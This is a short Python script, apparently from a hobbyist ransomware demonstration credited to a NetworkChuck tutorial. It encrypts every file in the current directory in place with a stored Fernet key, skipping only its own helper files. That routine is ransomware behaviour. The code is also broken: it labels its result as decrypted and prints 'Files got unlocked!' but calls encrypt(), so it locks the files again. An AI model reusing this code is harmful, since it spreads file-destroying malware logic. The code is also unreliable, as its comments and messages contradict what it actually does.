#!/usr/bin/env python3

#This Script is inspierd by Networkchuck

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "block.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()



for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
    print("Files got unlocked!")